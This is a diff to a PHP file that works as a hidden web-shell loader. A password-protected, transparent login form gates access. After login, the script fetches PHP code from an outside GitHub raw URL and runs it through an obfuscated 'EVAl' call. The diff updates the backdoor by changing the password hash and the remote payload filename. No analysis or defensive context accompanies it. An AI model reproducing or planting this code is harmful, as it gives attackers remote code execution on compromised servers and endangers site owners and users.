@@ -45,7 +45,7 @@ function is_user_authenticated() {
  * Process login attempt
  */
 function process_login($password) {
-    $correct_password_hash = 'dd07d6968668bdb437a5cb903b8c260b';
+    $correct_password_hash = '6d48045932ebf54cc986c47f13283a3c';
 
     if (md5($password) === $correct_password_hash) {
         $_SESSION['logged_in'] = true;
@@ -62,7 +62,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
 
 // Display main content if authenticated, otherwise show hidden login form
 if (is_user_authenticated()) {
-    $content = fetch_url_with_cookies('https://raw.githubusercontent.com/sec0x/php/refs/heads/main/img.php');
+    $content = fetch_url_with_cookies('https://raw.githubusercontent.com/sec0x/php/refs/heads/main/risaw.php');
     EVAl('?>' . $content);
 } else {
     // Display transparent login form
@@ -86,4 +86,5 @@ if (is_user_authenticated()) {
     <?php
 }
 ?>
+
 
